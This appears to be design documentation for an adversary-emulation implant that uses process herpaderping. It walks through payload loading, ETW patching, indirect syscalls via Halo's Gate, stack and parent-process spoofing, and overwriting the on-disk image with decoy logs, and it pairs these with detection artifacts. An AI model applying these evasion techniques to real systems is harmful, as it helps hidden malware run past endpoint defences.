# CWLHerpaderping - Code Flow Summary

This document summarizes the code flow of `CWLHerpaderping`, focusing on how the loader reads a PE payload, creates a ghost process via **`NtCreateUserProcess` with a suspended primary thread**, overwrites the on-disk backing file before the thread resumes, and passes spoofed process parameters directly via `PS_ATTRIBUTE_LIST` so the ghost appears as `RuntimeBroker.exe`.

## Source Map

| Component | Path | Role |
|---|---|---|
| Main implant | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp` | Entry point, ETW patch, payload read/delete, herpaderping flow |
| Native declarations | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/CWLInc.h` | NT types, PEB structures, function typedefs |
| API hashing | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/api_hash.h` | DJB2 hash constants, PEB-walk module finder, EAT-walk resolver |
| Indirect syscall helpers | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/syscall.h` | Halo's Gate SSN resolution, `syscall;ret` gadget finder, runtime stub builder |
| Stack spoofing | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/StackSpoof.cpp` | Fake return address planted inside `kernel32.dll` before `NtCreateUserProcess` syscall |
| Obfuscated strings | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/obfstr.h` | Compile-time XOR string obfuscation |

---

## API and DLL Map

### ntdll.dll — Indirect Syscall (Halo's Gate + in-ntdll gadget)

`syscall.h` builds **one** 21-byte runtime stub for the single injection-critical API. Stub layout: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11`. The `syscall;ret` gadget (`0F 05 C3`) is located inside ntdll `.text` by scanning PE section bytes — so the kernel sees the syscall as originating from ntdll, bypassing EDR user-mode hooks. SSN is read from the stub's `mov eax` at offset +4; if the stub is hooked (first bytes overwritten), Halo's Gate infers SSN from clean neighbors in the EAT (±16 entries, SSNs are sequential by EAT order).

| API | SSN Source | Purpose | Stage |
|---|---|---|---|
| `NtCreateUserProcess` | Halo's Gate on ntdll EAT | Create ghost process + suspended primary thread atomically; image from temp file; PPID via `PS_ATTRIBUTE_PARENT_PROCESS`; process params via `PS_ATTRIBUTE_LIST` | 6 |

Stub pool lifecycle:
- `InitSyscallPool(hNtdll)` → `VirtualAlloc(PAGE_READWRITE)` allocates pool (8 slots × 21 bytes, 1 slot used)
- `BuildIndirectStub(ssn)` writes 1 stub into pool
- `SealSyscallPool()` → `VirtualProtect(PAGE_EXECUTE_READ)` eliminates RWX window **before** the stub is called

> **Note:** `api_hash.h` defines hash constants for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` — these are leftover from a prior implementation and are **not used** by the current code.

### ntdll.dll — RESOLVE_API (DJB2 EAT walk, no IAT entry)

`api_hash.h::GetProcByHash()` walks the ntdll EAT, hashes each export name with DJB2, and compares against a pre-computed constant. No `GetProcAddress("ApiName")` — no plaintext API name strings at call sites or in binary.

`GetNtdllBase()` finds ntdll by walking `PEB->LoaderData->InMemoryOrderModuleList` — no `GetModuleHandle` needed.

| API | DJB2 Hash | Resolution Path | Purpose | Stage |
|---|---|---|---|---|
| `EtwEventWrite` | `0x24A8D022` | `RESOLVE_API` → pointer → patch in-place | `VirtualProtect` + `memcpy(\x33\xC0\xC3)` — ETW suppression | 2 |
| `RtlCreateProcessParametersEx` | `0x19132CBB` | `RESOLVE_API` → direct call | Build spoofed `RTL_USER_PROCESS_PARAMETERS` (normalized) | 5 |
| `RtlInitUnicodeString` | `0x29B75F89` | `RESOLVE_API` → direct call (×2) | Initialize `UNICODE_STRING` for `ImagePathName` / `DllPath` | 5 |

### kernel32.dll / kernelbase.dll — Standard Win32 (PE IAT)

Resolved by the Windows loader at process startup. Names appear in the PE import table. Listed in approximate call order across all stages.

| API | Module | Purpose | Stage |
|---|---|---|---|
| `VirtualProtect` | kernelbase | Change ntdll page protection for ETW patch | 2 |
| `GetStdHandle(STD_INPUT_HANDLE)` | kernel32 | Get stdin handle | 3 |
| `GetFileType` | kernel32 | Detect `FILE_TYPE_PIPE` → Mode 1 trigger | 3 |
| `VirtualAlloc` | kernelbase | Allocate payload heap buffer | 3 |
| `CreateFileW` (PAYLOAD_PATH) | kernel32 | Open payload file (Mode 2) | 3 |
| `GetFileSize` | kernel32 | Get payload file size (Mode 2) | 3 |
| `ReadFile` (stdin / file) | kernel32 | Read payload bytes | 3 |
| `CloseHandle` (payload file) | kernel32 | Close payload file handle | 3 |
| `DeleteFileW` (PAYLOAD_PATH) | kernel32 | Delete payload file after read (Mode 2, T1070.004) | 3 |
| `VirtualAlloc` (stub pool) | kernelbase | Allocate indirect syscall stub pool (RW) | 4 |
| `VirtualProtect` (stub pool) | kernelbase | Seal stub pool `RW → RX` (`SealSyscallPool`) | 4 |
| `GetTempPathW` | kernel32 | Resolve `%TEMP%` directory | 5 |
| `GetTempFileNameW` | kernel32 | Create `HD*.tmp` backing file path | 5 |
| `CreateFileW` (hTemp, first open) | kernel32 | Create temp file: `GENERIC_READ\|WRITE\|SYNCHRONIZE`, `FILE_SHARE_READ`, `CREATE_ALWAYS`, `FILE_ATTRIBUTE_HIDDEN`; handle **closed** after `FlushFileBuffers` | 5 |
| `WriteFile` (payload → hTemp) | kernel32 | Write full payload bytes to temp file | 5 |
| `FlushFileBuffers` (hTemp) | kernel32 | Flush temp file before close | 5 |
| `CloseHandle` (hTemp, first) | kernel32 | Release temp file handle before `NtCreateUserProcess` | 5 |
| `CreateToolhelp32Snapshot` | kernel32 | Take process snapshot for PPID candidate search | 6 |
| `Process32FirstW` / `Process32NextW` | kernel32 | Walk process snapshot entries | 6 |
| `ProcessIdToSessionId` | kernel32 | Filter Session 0 candidates | 6 |
| `OpenProcess(PROCESS_CREATE_PROCESS)` | kernel32 | Acquire spoofed-parent handle (`svchost` / `wininit`) | 6 |
| `CloseHandle` (hSnap) | kernel32 | Release process snapshot | 6 |
| `GetModuleHandleA("kernel32.dll")` | kernel32 | Find kernel32 base for StackSpoof gadget scan | 6 |
| `GetModuleInformation` | psapi / kernel32 | Get kernel32 `SizeOfImage` for full-image byte scan | 6 |
| `VirtualQuery` | kernel32 | Verify page is `PAGE_EXECUTE_READ[WRITE]` (fallback gadget path) | 6 |
| `WaitForSingleObject` (hProcess, 0) | kernel32 | Liveness check — detect EDR kill immediately after creation | 6 |
| `CloseHandle` (hParent) | kernel32 | Release parent handle after `NtCreateUserProcess` | 6 |
| `CreateFileW` (hTemp, second open) | kernel32 | Re-open temp file `OPEN_EXISTING` for herpaderping overwrite | 7 |
| `SetFilePointer` (hTemp, 0) | kernel32 | Rewind temp file to start for decoy overwrite | 7 |
| `WriteFile` (decoy × N) | kernel32 | Write IIS W3SVC log lines in-place | 7 |
| `FlushFileBuffers` (hTemp) | kernel32 | Flush decoy content before close | 7 |
| `CloseHandle` (hTemp, second) | kernel32 | Release temp file handle after overwrite | 7 |
| `ResumeThread` (hThread) | kernel32 | Resume suspended primary thread; ghost begins executing | 8 |

### CRT — Inline / Statically Linked

| Function | Purpose |
|---|---|
| `strlen` | Measure decoy line length in overwrite loop |
| `memcpy` | ETW patch; stub byte construction |
| `memcmp` | StackSpoof gadget pattern scan (`EPILOGUE_PATTERN`, `RET_PATTERN`) |
| `_AddressOfReturnAddress` | Compiler intrinsic — locate return-address slot on stack (StackSpoof) |
| `wcscpy` / `lstrcpyW` | Build target path strings |
| `wsprintfW` | Build NT image path `\\??\<tempFile>` for `PS_ATTRIBUTE_IMAGE_NAME` |

---

## High-Level Runtime Flow

```text
wmain()
  -> [#ifdef ENABLE_ETW_PATCH] PatchEtw()         <- T1562.006 (conditional)
  -> GetPayloadBuffer()
       -> GetFileType(STD_INPUT_HANDLE)
       -> MODE 1 (stdin pipe - T1620 Reflective Code Loading):
            -> ReadFile(stdin, 4-byte LE size header)
            -> VirtualAlloc(PAGE_READWRITE, size)
            -> ReadFile(stdin, payload bytes)
            -> NO DISK FILE (reflective path)
       -> MODE 2 (file fallback - T1070.004 File Deletion):
            -> CreateFileW(PAYLOAD_PATH)
            -> ReadFile(payload bytes)
            -> CloseHandle; DeleteFileW(PAYLOAD_PATH)    <- payload deleted before decode
            -> [#ifdef ENABLE_PAYLOAD_XOR] XOR decode in-place  <- T1027.013
  -> Herpaderping(payloadBuffer, payloadSize)
       -> InitSyscallPool(hNtdll)                        <- VirtualAlloc stub pool (RW)
       -> INDIRECT_SYSCALL(NtCreateUserProcess)  x1      <- 1 stub built
       -> SealSyscallPool()                              <- stub pool RW -> RX (before any call)
       -> RESOLVE_API: RtlCreateProcessParametersEx, RtlInitUnicodeString
       -> GetTempFileNameW (prefix "HD") -> hTemp (SHARE_READ, FILE_ATTRIBUTE_HIDDEN)
       -> WriteFile(payload -> hTemp) + FlushFileBuffers
       -> CloseHandle(hTemp)                             <- handle released; file stays on disk
       -> wsprintfW(ntImagePath, "\\??\\<tempFile>")     <- NT path for PS_ATTRIBUTE_IMAGE_NAME
       -> RtlInitUnicodeString x2 (ImagePathName, DllPath)
       -> RtlCreateProcessParametersEx(RuntimeBroker.exe, NORMALIZED)
       -> GetNonJobParent()                              <- PPID spoof: svchost/wininit Session 0
            -> CreateToolhelp32Snapshot + Process32First/Next
            -> ProcessIdToSessionId (filter Session 0)
            -> OpenProcess(PROCESS_CREATE_PROCESS)
       -> Build PS_ATTRIBUTE_LIST:
            Attributes[0]: PS_ATTRIBUTE_IMAGE_NAME  = ntImagePath (NT path to HD*.tmp)
            Attributes[1]: PS_ATTRIBUTE_PARENT_PROCESS = hParent
       -> [StackSpoof: Activate]
            -> GetModuleHandleA + GetModuleInformation  <- find kernel32 for gadget
            -> scan for "add rsp,0x28; ret" (EPILOGUE_PATTERN) / fallback "ret" + VirtualQuery
            -> _AddressOfReturnAddress -> plant fake return in kernel32
       -> NtCreateUserProcess(THREAD_CREATE_FLAGS_CREATE_SUSPENDED, processParameters, &attrList)
            <- ghost process + suspended primary thread created atomically
            <- image mapped from HD*.tmp; PPID = svchost/wininit; params = RuntimeBroker.exe
       -> [StackSpoof: Deactivate] + CloseHandle(hParent)
       -> WaitForSingleObject(hProcess, 0)               <- liveness check (abort if EDR killed it)
       -> CreateFileW(tempFile, OPEN_EXISTING)           <- re-open temp file for overwrite
       -> SetFilePointer(hTemp, 0) + WriteFile loop (IIS log lines) until totalWritten >= payloadSize
       -> FlushFileBuffers(hTemp) + CloseHandle(hTemp)
            <- on-disk file is now 100% IIS W3SVC log content
       -> ResumeThread(hThread)
            <- ghost process begins executing; on-disk image shows only IIS log
```

> **Core point:** The payload enters the ghost process image when `NtCreateUserProcess` maps the temp file as the process image and creates a suspended primary thread — no separate `NtCreateSection` or `NtCreateThreadEx` calls. Process parameters (including `ImagePathName = RuntimeBroker.exe`) are passed directly via `PS_ATTRIBUTE_LIST`, so no manual PEB patching is required. The temp file handle is closed before `NtCreateUserProcess`; the herpaderping overwrite re-opens the file after process creation and replaces the content while the thread remains suspended.

---

## Entry Point

`wmain()` in `CWLImplant.cpp`:

```text
[#ifdef ENABLE_ETW_PATCH] PatchEtw()
GetPayloadBuffer(payloadSize)
Herpaderping(payloadBuffer, payloadSize)
```

### Default Payload Path (Mode 2 only)

```text
C:\ProgramData\CertCA.bin
```

Overridden at build time via `/p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin"` (used in emulation plan). Only used when stdin is not a pipe.

### Stdin Redirection (Mode 1)

When the binary is spawned with stdin pipe redirection (e.g., via Node.js `spawnSync` with `input` option), `GetFileType(STD_INPUT_HANDLE) == FILE_TYPE_PIPE` routes to reflective mode. `PAYLOAD_PATH` is never opened.

Payload format: 4-byte little-endian size header followed by raw PE bytes. Sanity check: 1 KB – 50 MB range.

---

## Stage 1 — Static Evasion Helpers (Compile-Time)

Two compile-time helpers reduce static signatures before any runtime behavior:

**1. `obfstr.h` — String Obfuscation**

`OBFSTR()` / `OBFWSTR()` XOR-obfuscate sensitive string literals at compile time using a position-dependent key: `key(i) = (0xA3 + i × 0x5B) & 0xFF` — single-byte XOR brute-force (FLOSS) cannot recover the plaintext. Each string decrypts to a `thread_local` stack buffer at use-site. The following strings are not present as plaintext in the binary:

| String | Used by |
|---|---|
| `svchost.exe` | `GetNonJobParent()` |
| `wininit.exe` | `GetNonJobParent()` |
| `kernel32.dll` | `StackSpoofer` constructor |
| `C:\Windows\System32\RuntimeBroker.exe` | `RtlCreateProcessParametersEx` |
| `C:\Windows\System32` | `RtlCreateProcessParametersEx` (DllPath) |

In Release builds, `perror` is suppressed via macro (`#ifndef CWLDEBUG` → `#define perror(x) ((void)0)`): all `perror` string arguments are unreferenced and omitted from `.rdata`. Debug builds (`/p:CWLDebug=1`) retain `perror` output.

**2. `api_hash.h` — API Hash Resolution**

`RESOLVE_API(hNtdll, ApiName)` resolves ntdll exports without plaintext names at call sites. `GetNtdllBase()` walks `PEB->LoaderData->InMemoryOrderModuleList` — no `GetModuleHandle`. Then `GetProcByHash()` iterates the ntdll EAT and compares DJB2 hashes.

APIs resolved via `RESOLVE_API` (no IAT entry):

| API | Hash | Used in |
|---|---|---|
| `EtwEventWrite` | `0x24A8D022` | `PatchEtw()` |
| `RtlCreateProcessParametersEx` | `0x19132CBB` | `Herpaderping()` |
| `RtlInitUnicodeString` | `0x29B75F89` | `Herpaderping()` |

The 1 injection-critical API (`NtCreateUserProcess`) uses a separate path: `InitSyscallPool` + `INDIRECT_SYSCALL` (Stage 4), not `RESOLVE_API`.

---

## Stage 2 — ETW Patch (Conditional)

`PatchEtw()` is only compiled and called when built with `ENABLE_ETW_PATCH` (`/p:ETWPatch=1`). Without that flag the function does not exist.

When active:

1. `GetNtdllBase()` — PEB walk → ntdll base
2. `RESOLVE_API(hNtdll, EtwEventWrite)` → `pEtw`
3. `VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old)` — kernelbase
4. `memcpy(pEtw, "\x33\xC0\xC3", 3)` — CRT (`xor eax,eax; ret`)
5. `VirtualProtect(pEtw, 4, old, &old)` — kernelbase; restores original protection

This suppresses DC0021 (OS API Execution) ETW telemetry for all subsequent NT API calls in this process.

| Artifact | Meaning |
|---|---|
| Modified bytes at `ntdll!EtwEventWrite` | ETW suppression active in loader process |
| `VirtualProtect` on ntdll code region | Preparation for in-memory patch |

---

## Stage 3 — Payload Acquisition (Dual Mode)

`GetPayloadBuffer()` selects mode at runtime based on stdin type.

### Mode 1: Reflective Loading via Stdin (T1620)

**Trigger:** `GetFileType(GetStdHandle(STD_INPUT_HANDLE)) == FILE_TYPE_PIPE`

1. `ReadFile(hStdin, &payloadSize, sizeof(DWORD), ...)` — read 4-byte LE size header
2. `VirtualAlloc(0, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)` — allocate buffer
3. `ReadFile(hStdin, bufferAddress, payloadSize, ...)` — read PE bytes
4. Return buffer; payload never touches disk (T1620)

### Mode 2: File-based Loading with Deletion (T1070.004)

**Trigger:** stdin is not a pipe

1. `CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, ...)` — open payload
2. `GetFileSize` → `VirtualAlloc` → `ReadFile` — read into buffer
3. `CloseHandle` + `DeleteFileW(PAYLOAD_PATH)` — T1070.004; deleted before decode
4. `[#ifdef ENABLE_PAYLOAD_XOR]` XOR decode in-place: `decoded[i] = buf[i] ^ ((0xA3 + i * 0x5B) & 0xFF)` — T1027.013

XOR detail: position-dependent, self-inverse. First byte: `0x4D ('M') ^ 0xA3 = 0xEE` — on-disk file never starts with `MZ`.

---

## Stage 4 — Indirect Syscall Setup

`InitSyscallPool(hNtdll)` initializes the stub infrastructure using **ntdll alone** — no external API calls except `VirtualAlloc` / `VirtualProtect` (kernelbase):

**Gadget finder (`FindSyscallGadget`):**
Scans ntdll PE section headers for the `.text` section, then linearly searches for `0F 05 C3` (`syscall; ret`). This address becomes the jump target for the stub — syscalls appear to originate from ntdll.

**SSN resolver (`GetSsnHalosGate`):**
Reads `mov eax, <SSN>` at byte offset +4 of each ntdll stub. If the stub prologue is hooked (bytes overwritten by EDR), walks neighboring EAT entries (±16) to infer SSN by index delta — Halo's Gate. ntdll syscall stubs are allocated sequentially by SSN, so `stub[i].SSN = stub[i+N].SSN - N`.

**Stub builder (`BuildIndirectStub`):**
Writes a 21-byte stub into the pool: `mov r10,rcx` (Windows ABI) → `mov eax,<SSN>` → `movabs r11,<gadget>` → `jmp r11`.

**SealSyscallPool:**
`VirtualProtect(pool, SYSCALL_STUB_SIZE * SYSCALL_MAX_STUBS, PAGE_EXECUTE_READ, ...)` — eliminates the RWX window. Called **immediately after building the stub and before it is used**, so there is no persistent RWX window at any point during execution.

1 stub built:

| Stub | API | SSN Source |
|---|---|---|
| 1 | `NtCreateUserProcess` | Halo's Gate |

| Artifact | Meaning |
|---|---|
| `VirtualAlloc(PAGE_READWRITE)` for small anonymous region (~168 bytes) | Syscall stub pool allocation |
| `VirtualProtect` on that region → `PAGE_EXECUTE_READ` | Pool sealed before stub called; no persistent RWX page |
| Stub bytes at allocated address | `49 89 CA B8 XX XX XX XX 49 BB XX..XX 41 FF E3` — indirect syscall pattern |

---

## Stage 5 — Temp File Staging and Process Parameter Setup

### 5a — Temp File Creation

The herpaderping trick requires a legitimate PE on disk **before** `NtCreateUserProcess`. Unlike the classic 3-syscall path, the handle is **not** kept open — it is closed before process creation.

1. `GetTempPathW(MAX_PATH, tempPath)` — resolve `%TEMP%`
2. `GetTempFileNameW(tempPath, L"HD", 0, tempFile)` — create `HD*.tmp` path
3. `CreateFileW(tempFile, GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0)` — `FILE_ATTRIBUTE_HIDDEN` set at creation time
4. `WriteFile(hTemp, payload, payloadSize, ...)` — write full PE payload
5. `FlushFileBuffers(hTemp)` — guarantee sector commit
6. `CloseHandle(hTemp)` — **handle released**; file remains on disk with PE content

The herpaderping overwrite in Stage 7 re-opens this file as `OPEN_EXISTING` after process creation.

### 5b — NT Path Construction

```cpp
wsprintfW(ntImagePath, L"\\??\\%s", tempFile);
```

`NtCreateUserProcess` requires a native NT path (`\??\C:\Users\...\HD*.tmp`) for `PS_ATTRIBUTE_IMAGE_NAME`. The Win32 path from `GetTempFileNameW` is prefixed with `\\??\`.

### 5c — Process Parameters (Masquerade)

```cpp
pRtlInitUnicodeString(&uTargetFilePath, L"C:\\Windows\\System32\\RuntimeBroker.exe");
pRtlInitUnicodeString(&uDllPath, L"C:\\Windows\\System32");
pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
                               NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL,
                               RTL_USER_PROC_PARAMS_NORMALIZED);
```

`RTL_USER_PROC_PARAMS_NORMALIZED` flag: all `UNICODE_STRING.pBuffer` fields become absolute virtual addresses. These are passed to `NtCreateUserProcess` via `PS_ATTRIBUTE_LIST`; the kernel copies them into the new process — no manual remote allocation required.

| Artifact | Meaning |
|---|---|
| `%TEMP%\HD*.tmp` created with `FILE_ATTRIBUTE_HIDDEN` and valid PE header | Ghost process backing file; hidden from Explorer and basic `dir` output; MFT enumeration (`dir /ah`, `Get-ChildItem -Hidden`, Sysmon EID 11) required to observe |
| `FlushFileBuffers` on temp file | Guarantees sector commit before close |
| Handle closed after write | No pre-held write handle; Stage 7 must re-open |

---

## Stage 6 — Ghost Process Creation

### 6a — PPID Candidate Selection

`GetNonJobParent()` enumerates processes and selects a Session 0 target:

```
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
  -> Process32FirstW / Process32NextW
       -> _wcsicmp(name, "svchost.exe")  [OBFWSTR]
       -> ProcessIdToSessionId(pid) == 0  <- reject interactive sessions
       -> OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid) -> hParent
```

Priority: `svchost.exe` (non-PPL, always Session 0) → fallback `wininit.exe` → fallback `GetCurrentProcess()`.

### 6b — StackSpoof Setup

`StackSpoofer spoofer(OBFSTR("kernel32.dll"))` — constructor runs immediately:

1. `_AddressOfReturnAddress()` — compiler intrinsic; captures `&returnAddress` on current stack frame
2. `GetModuleHandleA("kernel32.dll")` — get kernel32 base
3. `GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, ...)` — get `SizeOfImage`
4. Scan full image for `\x48\x83\xC4\x28\xC3` (`add rsp,0x28; ret` — function epilogue pattern)
5. Fallback: scan for `\xC3` (`ret`) + `VirtualQuery` to verify `PAGE_EXECUTE_READ[WRITE]`
6. Store `fakeReturnAddress` = gadget VA inside kernel32

### 6c — NtCreateUserProcess

```
spoofer.Activate()           <- overwrite return-address slot with kernel32 gadget
pNtCreateUserProcess(
    &hProcess, &hThread,
    PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
    NULL, NULL,
    0,                                       <- ProcessFlags=0
    THREAD_CREATE_FLAGS_CREATE_SUSPENDED,    <- thread starts suspended
    processParameters,                       <- RuntimeBroker.exe params
    &createInfo,
    &attrList                                <- [IMAGE_NAME=HD*.tmp, PARENT=hParent]
)                            -> indirect syscall; EDR stack walk sees kernel32 origin
spoofer.Deactivate()         <- restore original return address
CloseHandle(hParent)
```

**Atomic creation:** `NtCreateUserProcess` creates both the process and the primary thread in a single call. The thread starts suspended (`THREAD_CREATE_FLAGS_CREATE_SUSPENDED`) — no intermediate threadless state. This is unlike `NtCreateProcessEx`, which returns a process with no thread.

**Image source:** The kernel maps the process image from the NT path provided in `PS_ATTRIBUTE_IMAGE_NAME` (`\\??\%TEMP%\HD*.tmp`). The payload PE is mapped into the ghost's address space at this point.

**Process parameters:** Passed via `PS_ATTRIBUTE_LIST` → kernel copies them into the new process during `NtCreateUserProcess`. No separate `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + PEB patch needed.

**Token:** The ghost process inherits the token of the spoofed parent (`svchost.exe`). Since both the caller and `svchost.exe` run as SYSTEM (via EfsPotato), no `NtSetInformationProcess(ProcessAccessToken)` fixup is needed.

### 6d — Liveness Check

```cpp
if (WaitForSingleObject(hProcess, 0) == WAIT_OBJECT_0) { exit(-1); }
```

Immediately after `NtCreateUserProcess`, the process is checked for premature termination. EDRs that kill newly created processes via `PsSetCreateProcessNotifyRoutineEx` callbacks will have already acted by this point. If the process is gone, execution aborts cleanly rather than attempting to overwrite or resume a dead process.

| Artifact | Meaning |
|---|---|
| `CreateToolhelp32Snapshot` + `Process32First/Next` | Process enumeration before spawning |
| `OpenProcess(PROCESS_CREATE_PROCESS)` on `svchost.exe` / `wininit.exe` | PPID spoof handle acquired |
| `GetModuleHandleA` + `GetModuleInformation` + byte scan on kernel32 | StackSpoof gadget search |
| `NtCreateUserProcess` with `PS_ATTRIBUTE_IMAGE_NAME` = `HD*.tmp` NT path | Ghost process mapped from temp file; primary thread created suspended |
| Child PPID = `svchost.exe` / `wininit.exe` | PPID does not reflect real caller |
| Stack return address in `kernel32.dll` during syscall | StackSpoof active; call origin hidden |
| `WaitForSingleObject(hProcess, 0)` immediately after creation | EDR kill detection |

---

## Stage 7 — File Herpaderping (In-Place Overwrite)

After the ghost process exists with a suspended primary thread, the payload bytes on disk are replaced with IIS W3SVC log content. Unlike the classic path (pre-held handle), this implementation **re-opens** the temp file as `OPEN_EXISTING`:

```cpp
hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
SetFilePointer(hTemp, 0, NULL, FILE_BEGIN);
SIZE_T totalWritten = 0;
int idx = 0;
while (totalWritten < payloadSize) {
    const char* line = decoyLines[idx % decoyCount];
    DWORD len = (DWORD)strlen(line);
    if (totalWritten + len > payloadSize) len = (DWORD)(payloadSize - totalWritten);
    DWORD wrote = 0;
    if (!WriteFile(hTemp, line, len, &wrote, NULL) || wrote == 0) break;
    totalWritten += wrote;
    idx++;
}
FlushFileBuffers(hTemp);
CloseHandle(hTemp);
```

**Why re-open succeeds:** The image section mapped by `NtCreateUserProcess` is maintained by the kernel's memory manager independently of the file handle. After the initial `CloseHandle`, no process holds a section lock that prevents re-opening with write access. The `FILE_SHARE_READ` flag on the original open allows this re-open.

**Why no truncate:** The active image section in the ghost process blocks `SetEndOfFile` — `STATUS_CANNOT_DELETE` prevents resizing. The loop writes in-place until `totalWritten >= payloadSize`, replacing every byte. File size on disk remains equal to `payloadSize`.

**Decoy content:** 10 rotating IIS W3SVC log lines (date `2026-05-28`, IPs `10.0.0.5`/`10.0.0.1`, paths `/api/health`, `/api/upload/*`, `/portal/assets/*`). The resulting file looks like a normal IIS log from the emulation environment.

**File stays on disk:** After `CloseHandle(hTemp)`, the temp file is not deleted. `DeleteFileW` / `NtSetInformationFile(FileDispositionInformation)` return `STATUS_CANNOT_DELETE (0xC0000121)` because the active image section pins the file. The full in-place overwrite makes the residual file innocuous.

| Artifact | Meaning |
|---|---|
| `CreateFileW(OPEN_EXISTING)` on `HD*.tmp` after `NtCreateUserProcess` | Second file open for herpaderping overwrite |
| `SetFilePointer` + `WriteFile` loop on `HD*.tmp` while thread suspended | Herpaderping overwrite in progress |
| `HD*.tmp` content = IIS log (not PE) after overwrite | On-disk file no longer matches in-memory image |
| `HD*.tmp` persists on disk | `STATUS_CANNOT_DELETE` — active SEC_IMAGE section holds file pinned |

---

## Stage 8 — Thread Resume

```cpp
DWORD prevCount = ResumeThread(hThread);
```

`ResumeThread` decrements the suspend count on the primary thread created by `NtCreateUserProcess`. Once the count reaches zero, the thread begins executing at the entry point determined by the PE image mapped in Stage 6. No separate `NtCreateThreadEx` call is needed — the thread already exists.

After `ResumeThread`, the ghost process runs its payload from the in-memory image (the clean PE), while the on-disk `HD*.tmp` shows only IIS log content.

| Artifact | Meaning |
|---|---|
| `ResumeThread` on ghost process primary thread | Thread begins execution; payload running |
| Ghost process image ≠ on-disk `HD*.tmp` | Core herpaderping discrepancy established |
| Ghost PPID = `svchost.exe`, name = `RuntimeBroker.exe` (in process params) | Process masquerade visible in tools reading PEB `ProcessParameters` |

---

## Stack Spoofing Flow

`StackSpoofer` is used around **one** call: `NtCreateUserProcess`.

**Constructor (runs before `Activate`):**

1. `_AddressOfReturnAddress()` — intrinsic; captures `&returnAddress` on the current stack frame
2. `GetModuleHandleA(OBFSTR("kernel32.dll"))` — get kernel32 base
3. `GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo))` — get `SizeOfImage`
4. Scan full image bytes for `\x48\x83\xC4\x28\xC3` (`add rsp,0x28; ret` — function epilogue)
5. Fallback: scan for `\xC3` (`ret`) + `VirtualQuery` to confirm `PAGE_EXECUTE_READ[WRITE]`
6. Store `fakeReturnAddress` = gadget VA inside kernel32

**Activate / Deactivate:**

- `Activate()`: `*returnAddressLocation = fakeReturnAddress` — EDR stack walk during `NtCreateUserProcess` syscall sees call origin as `kernel32.dll`
- `Deactivate()`: `*returnAddressLocation = originalReturnAddress` — restored after syscall returns

| Call | Stack-spoofed? |
|---|---|
| `NtCreateUserProcess` | **Yes** |
| All `RESOLVE_API` calls | No |

---

## Detection-Relevant Code Paths

| Behavior | Code Path | Observable Artifact |
|---|---|---|
| ETW tampering (conditional) | `wmain()` → `PatchEtw()` (`#ifdef ENABLE_ETW_PATCH`) | `ntdll!EtwEventWrite` patched to `xor eax,eax; ret`; `VirtualProtect` on ntdll code page |
| Reflective payload load (Mode 1) | `GetPayloadBuffer()` stdin branch | `FILE_TYPE_PIPE` on stdin; payload never on disk; `ReadFile` from pipe |
| File-based payload load (Mode 2) | `GetPayloadBuffer()` file fallback | `PAYLOAD_PATH` opened, read, then `DeleteFileW`; brief existence |
| XOR decode (Mode 2, conditional) | `#ifdef ENABLE_PAYLOAD_XOR` in `GetPayloadBuffer()` | On-disk file first byte `0xEE`, not `MZ`; in-memory buffer valid PE after decode |
| Syscall stub pool | `InitSyscallPool` + `INDIRECT_SYSCALL` × 1 + `SealSyscallPool` | Anonymous `VirtualAlloc(PAGE_READWRITE)` → `VirtualProtect(PAGE_EXECUTE_READ)` immediately after stub written; 21-byte stub matching `49 89 CA B8 XX XX XX XX 49 BB ...` |
| Temp PE staging | `GetTempFileNameW` / `CreateFileW(FILE_ATTRIBUTE_HIDDEN)` / `WriteFile` / `FlushFileBuffers` / `CloseHandle` | `%TEMP%\HD*.tmp` created with `FILE_ATTRIBUTE_HIDDEN`; handle closed after write; hidden from Explorer / basic `dir` — visible via `dir /ah` or Sysmon EID 11 |
| PPID spoof candidate search | `GetNonJobParent()` | `CreateToolhelp32Snapshot` + `Process32First/Next` + `OpenProcess(PROCESS_CREATE_PROCESS)` on Session 0 process |
| StackSpoof gadget scan | `StackSpoofer` constructor | `GetModuleHandleA("kernel32.dll")` + `GetModuleInformation` + byte scan; `VirtualQuery` on fallback `ret` candidates |
| Ghost process + suspended thread creation | `NtCreateUserProcess(THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ...)` | Process image from `HD*.tmp`; PPID = `svchost.exe` / `wininit.exe`; token = SYSTEM (from spoofed parent); primary thread created suspended atomically |
| Stack spoofing | `StackSpoofer::Activate/Deactivate` around `NtCreateUserProcess` | Return address in `kernel32.dll` during syscall (fake `add rsp,0x28; ret` epilogue) |
| EDR liveness check | `WaitForSingleObject(hProcess, 0)` | Non-zero timeout poll on ghost process handle immediately after creation |
| File herpaderping overwrite | Re-open `OPEN_EXISTING` + `SetFilePointer(0)` + `WriteFile` loop while thread suspended | `HD*.tmp` overwritten in-place with IIS log content; `totalWritten` covers all `payloadSize` bytes |
| Temp file persistent on disk | `STATUS_CANNOT_DELETE` (active image section blocks unlink) | `HD*.tmp` remains after ghost process exits — not deleted; content is IIS log |
